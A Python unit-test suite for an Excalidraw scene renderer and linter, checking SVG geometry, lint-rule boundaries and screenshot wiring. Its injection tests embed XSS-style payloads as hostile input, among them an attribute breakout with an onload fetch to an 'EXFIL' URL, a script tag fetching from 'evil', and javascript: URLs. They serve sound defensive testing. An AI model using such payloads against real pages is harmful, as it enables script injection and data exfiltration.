"""excalidraw's render_check: the lint rules, the SVG it emits, and the screenshot wiring.

A `.excalidraw` scene is untrusted input the script's own pitch tells you to run it on, so
the injection tests here are the load-bearing ones: every scene value reaching an SVG
attribute must be a number or a colour, because the render page is loaded from a file://
origin. The rest pin geometry (assertions read the parsed SVG tree, never a substring —
substring checks passed while the canvas cropped, labels stacked at x=0 and every fill
vanished) and the boundary of each lint rule, since a rule that fires 3x over threshold
proves only that it exists.

No browser is launched: `make ci` stays offline and zero-install, so the Playwright stage
is covered as the pure environment it builds. The live loop is `--self-test`.
"""

import os
import re
import sys
import unittest
import xml.etree.ElementTree as ET

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
SCRIPTS = os.path.join(ROOT, "primitives-core", "skills", "excalidraw", "scripts")

sys.path.insert(0, SCRIPTS)

import render_check as rc  # noqa: E402

SVG_NS = "{http://www.w3.org/2000/svg}"


def el(eid, kind, x, y, w, h, **kw):
    out = {"id": eid, "type": kind, "x": x, "y": y, "width": w, "height": h}
    out.update(kw)
    return out


def scene(*elements, **app_state):
    return {"type": "excalidraw", "elements": list(elements), "appState": app_state}


def codes(sc):
    return [code for code, _ in rc.lint_scene(sc)]


def tree(sc):
    return ET.fromstring(rc.render_svg(sc))


def tags(root, name):
    return root.iter(SVG_NS + name)


def label(eid, container, text, **kw):
    """A text element bound to a container, both sides linked."""
    container.setdefault("boundElements", []).append({"id": eid, "type": "text"})
    return el(eid, "text", container["x"], container["y"], 0, 25,
              text=text, fontSize=20, containerId=container["id"], **kw)


class Injection(unittest.TestCase):
    """A crafted scene must not make the render page fetch or execute anything."""

    HOSTILE = '#000" onload="fetch(\'http://127.0.0.1:9/EXFIL.png\')'

    def urls(self, svg):
        return set(re.findall(r"https?://[^\s\"'<>]+", svg))

    def test_crafted_stroke_color_cannot_break_out_of_the_attribute(self):
        svg = rc.render_svg(scene(el("a", "rectangle", 0, 0, 10, 10,
                                     strokeColor=self.HOSTILE)))
        self.assertNotIn("EXFIL", svg)
        self.assertNotIn("onload", svg)
        self.assertIn('stroke="#1e1e1e"', svg)

    def test_crafted_background_color_cannot_break_out_of_the_attribute(self):
        svg = rc.render_svg(scene(el("a", "rectangle", 0, 0, 10, 10,
                                     backgroundColor='url(http://127.0.0.1:9/EXFIL.png)')))
        self.assertNotIn("EXFIL", svg)
        self.assertIn('fill="none"', svg)

    def test_crafted_canvas_background_cannot_break_out_of_the_attribute(self):
        svg = rc.render_svg(scene(el("a", "rectangle", 0, 0, 10, 10),
                                  viewBackgroundColor=self.HOSTILE))
        self.assertNotIn("EXFIL", svg)
        self.assertIn('fill="#ffffff"', svg)

    def test_crafted_numbers_cannot_break_out_of_the_attribute(self):
        svg = rc.render_svg(scene(el("a", "rectangle", '0" onload="alert(1)', 0, 10, 10,
                                     strokeWidth='2" onload="alert(1)',
                                     opacity='100" onload="alert(1)'),
                                  el("t", "text", 0, 0, 10, 10, text="hi",
                                     fontSize='20" onload="alert(1)')))
        self.assertNotIn("onload", svg)
        self.assertNotIn("alert", svg)

    def test_text_and_frame_names_are_escaped(self):
        svg = rc.render_svg(scene(
            el("t", "text", 0, 0, 100, 20, text="<script>fetch('http://evil/x')</script>"),
            el("f", "frame", 0, 0, 100, 100, name='</text><script>alert(1)</script>'),
        ))
        self.assertNotIn("<script", svg)
        self.assertIn("&lt;script&gt;", svg)

    def test_esc_output_is_safe_in_an_attribute_too(self):
        """Today `_esc` only wraps text content; the quote escape is what keeps it safe
        for the next caller that puts it in an attribute."""
        self.assertEqual("&quot;&gt;&lt;script&gt;", rc._esc('"><script>'))

    def test_the_only_url_in_a_hostile_render_is_the_svg_namespace(self):
        svg = rc.render_svg(scene(
            el("a", "rectangle", 0, 0, 10, 10, strokeColor=self.HOSTILE,
               backgroundColor="url(http://127.0.0.1:9/bg.png)"),
            el("t", "text", 0, 0, 10, 10, text="http://127.0.0.1:9/in-text",
               strokeColor="javascript:alert(1)"),
            viewBackgroundColor="url(http://127.0.0.1:9/canvas.png)",
        ))
        # The text CONTENT may legitimately contain a URL string; no attribute may.
        attrs = re.sub(r">[^<]*<", "><", svg)
        self.assertEqual({"http://www.w3.org/2000/svg"}, self.urls(attrs))

    def test_a_hostile_scene_still_renders_rather_than_crashing(self):
        root = tree(scene(el("a", "rectangle", "x", None, [], {}, strokeWidth="wide")))
        self.assertEqual(1, len(list(tags(root, "rect"))) - 1)  # minus the canvas


class Geometry(unittest.TestCase):
    def test_scene_bounds_pads_the_content(self):
        bounds = rc.scene_bounds([el("a", "rectangle", 100, 200, 50, 40)])
        self.assertEqual((100 - rc.PAD, 200 - rc.PAD, 150 + rc.PAD, 240 + rc.PAD), bounds)
        self.assertGreater(rc.PAD, 0, "no padding crops strokes at the canvas edge")

    def test_the_svg_carries_a_viewbox_matching_its_size(self):
        root = tree(scene(el("a", "rectangle", 0, 0, 100, 50)))
        width, height = root.get("width"), root.get("height")
        self.assertEqual(f"0 0 {width} {height}", root.get("viewBox"))

    def test_a_filled_shape_keeps_its_fill(self):
        root = tree(scene(el("a", "rectangle", 0, 0, 10, 10, backgroundColor="#a5d8ff")))
        fills = [r.get("fill") for r in tags(root, "rect")]
        self.assertIn("#a5d8ff", fills)

    def test_a_label_is_centred_on_its_container(self):
        box = el("b", "rectangle", 100, 100, 200, 80)
        text = label("b-label", box, "Browser")
        root = tree(scene(box, text))
        drawn = [t for t in tags(root, "text") if t.text == "Browser"]
        self.assertEqual(1, len(drawn))
        self.assertAlmostEqual(200.0, float(drawn[0].get("x")), places=1)
        self.assertEqual("middle", drawn[0].get("text-anchor"))

    def test_rotation_is_rendered(self):
        root = tree(scene(el("a", "rectangle", 0, 0, 100, 50, angle=1.5707963)))
        rect = [r for r in tags(root, "rect") if r.get("transform")]
        self.assertEqual(1, len(rect))
        self.assertTrue(rect[0].get("transform").startswith("rotate(90.00 "))

    def test_an_unsupported_type_is_outlined_not_dropped(self):
        root = tree(scene(el("a", "embeddable", 0, 0, 100, 50)))
        notes = [t.text for t in tags(root, "text")]
        self.assertIn("unsupported: embeddable", notes)


class OverlapRule(unittest.TestCase):
    def test_partial_intersection_is_a_finding(self):
        sc = scene(el("a", "rectangle", 0, 0, 100, 100),
                   el("b", "rectangle", 50, 50, 100, 100))
        self.assertIn("overlap", codes(sc))

    def test_a_zone_background_holding_boxes_is_clean(self):
        """The commonest Excalidraw idiom: a pale rect with shapes drawn on top."""
        sc = scene(el("zone", "rectangle", 0, 0, 400, 300, backgroundColor="#f1f3f5"),
                   el("a", "rectangle", 20, 20, 100, 60),
                   el("b", "rectangle", 200, 20, 100, 60))
        self.assertEqual([], rc.lint_scene(sc))

    def test_a_badge_flush_in_a_corner_is_clean(self):
        sc = scene(el("card", "rectangle", 0, 0, 200, 100),
                   el("badge", "ellipse", 0, 0, 24, 24))
        self.assertEqual([], rc.lint_scene(sc))


class TextOverflowRule(unittest.TestCase):
    def box_with(self, text, box_width, **text_kw):
        box = el("b", "rectangle", 0, 0, box_width, 60)
        return scene(box, label("b-label", box, text, **text_kw))

    def test_a_label_that_exactly_fills_the_room_is_clean(self):
        room = 180 - 2 * rc.LABEL_PAD
        self.assertEqual([], rc.lint_scene(self.box_with("x", 180, width=room)))

    def test_one_pixel_past_the_room_is_a_finding(self):
        room = 180 - 2 * rc.LABEL_PAD
        self.assertIn("text-overflow", codes(self.box_with("x", 180, width=room + 1)))

    def test_the_measured_width_beats_the_character_estimate(self):
        """Two characters, but the app measured 400px — the estimate would say it fits."""
        self.assertIn("text-overflow", codes(self.box_with("hi", 180, width=400)))

    def test_a_hand_authored_label_falls_back_to_the_estimate(self):
        """No `width` key: 10 chars at 20px must overflow a 124px box, and only just."""
        estimate = 10 * 20 * rc.CHAR_EM
        self.assertAlmostEqual(110.0, estimate, places=1)
        self.assertIn("text-overflow", codes(self.box_with("x" * 10, 124)))
        self.assertEqual([], rc.lint_scene(self.box_with("x" * 10, 140)))

    def test_an_arrow_label_is_not_measured_against_the_arrow_span(self):
        arrow = el("a1", "arrow", 0, 0, 40, 0, points=[[0, 0], [40, 0]])
        sc = scene(arrow, label("a1-label", arrow, "retries twice", width=120))
        self.assertEqual([], rc.lint_scene(sc))


class FrameRule(unittest.TestCase):
    def test_a_shape_outside_its_frame_is_a_finding(self):
        sc = scene(el("f", "frame", 0, 0, 100, 100),
                   el("a", "rectangle", 200, 200, 20, 20, frameId="f"))
        self.assertIn("frame-escape", codes(sc))

    def test_an_arrow_may_cross_between_stacked_frames(self):
        """The Layers pattern the skill documents: tiers stacked, arrows crossing down."""
        sc = scene(el("top", "frame", 0, 0, 400, 100),
                   el("bottom", "frame", 0, 200, 400, 100),
                   el("a1", "arrow", 200, 80, 0, 140, points=[[0, 0], [0, 140]],
                      frameId="top"))
        self.assertEqual([], rc.lint_scene(sc))

    def test_a_frame_id_naming_a_non_frame_is_a_finding(self):
        sc = scene(el("box", "rectangle", 0, 0, 400, 400),
                   el("a", "rectangle", 10, 10, 20, 20, frameId="box"))
        self.assertIn("frame-escape", codes(sc))


class ReferenceRules(unittest.TestCase):
    def test_a_binding_naming_a_missing_element(self):
        sc = scene(el("a1", "arrow", 0, 0, 40, 0, points=[[0, 0], [40, 0]],
                      endBinding={"elementId": "ghost"}))
        self.assertIn("dangling-arrow", codes(sc))

    def test_bound_elements_naming_a_missing_element(self):
        sc = scene(el("b", "rectangle", 0, 0, 100, 60,
                      boundElements=[{"id": "ghost", "type": "text"}]))
        self.assertIn("dangling-ref", codes(sc))

    def test_a_label_with_no_back_reference(self):
        box = el("b", "rectangle", 0, 0, 200, 60)
        text = label("b-label", box, "hi", width=100)
        box["boundElements"] = []
        self.assertIn("orphan-label", codes(scene(box, text)))


class SampleAndDefects(unittest.TestCase):
    def setUp(self):
        import json
        with open(rc.SAMPLE, encoding="utf-8") as fh:
            self.sample = json.load(fh)

    def test_the_shipped_sample_is_clean(self):
        self.assertEqual([], rc.lint_scene(self.sample))

    def test_every_injectable_defect_is_detected(self):
        for kind in rc.DEFECTS:
            with self.subTest(kind=kind):
                self.assertIn(kind, codes(rc.introduce_defect(self.sample, kind)))

    def test_injecting_into_a_foreign_scene_explains_itself(self):
        foreign = scene(el("mine", "rectangle", 0, 0, 10, 10))
        with self.assertRaises(SystemExit) as caught:
            rc.introduce_defect(foreign, "overlap")
        self.assertIn("bundled sample", str(caught.exception))


class ScreenshotWiring(unittest.TestCase):
    """The Playwright stage, checked without launching anything."""

    def setUp(self):
        self.saved = os.environ.get("EXCALIDRAW_NODE_PATH")
        os.environ["EXCALIDRAW_NODE_PATH"] = "/from/env"

    def tearDown(self):
        if self.saved is None:
            os.environ.pop("EXCALIDRAW_NODE_PATH", None)
        else:
            os.environ["EXCALIDRAW_NODE_PATH"] = self.saved

    def test_the_env_var_supplies_node_path(self):
        self.assertEqual("/from/env", rc.node_path())

    def test_an_explicit_path_wins(self):
        self.assertEqual("/from/flag", rc.node_path("/from/flag"))

    def test_the_driver_env_carries_every_value_the_driver_reads(self):
        env = rc.shot_env("/tmp/a.svg", "/tmp/a.png", 800.4, 600.6)
        self.assertEqual("/from/env", env["NODE_PATH"])
        self.assertEqual("/tmp/a.svg", env["EXC_SVG"])
        self.assertEqual("/tmp/a.png", env["EXC_PNG"])
        self.assertEqual(("800", "600"), (env["EXC_W"], env["EXC_H"]))

    def test_the_driver_actually_screenshots_the_local_file(self):
        for needed in ("page.screenshot(", "process.env.EXC_PNG", "'file://'",
                       "chromium.launch("):
            self.assertIn(needed, rc.DRIVER)


if __name__ == "__main__":
    unittest.main()
